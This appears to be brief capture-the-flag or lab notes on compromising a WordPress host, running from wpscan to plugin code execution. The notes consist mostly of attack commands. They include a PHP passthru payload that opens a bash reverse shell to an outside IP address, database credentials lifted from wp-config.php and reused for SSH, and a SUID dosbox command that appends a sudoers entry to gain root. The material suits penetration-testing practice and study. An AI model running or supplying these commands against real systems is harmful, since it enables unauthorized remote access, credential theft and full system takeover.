# wpscan -> plugin -> RCE

### Payload by PHP passthru
```python
payload = '<?php passthru("bash -i >& /dev/tcp/192.168.118.8/80 0>&1"); ?>'
```

Most important part. Because the exploit won't work properly as a webshell or others.

### Lateral movement
`wp-config.php` reused creds for ssh

```php
/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
```

### Root
SUID /usr/bin/dosbox

```bash
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >c:$LFILE" -c exit
```

* https://steflan-security.com/linux-privilege-escalation-writable-passwd-file/

VNC 5901 ssh local port forward is optional.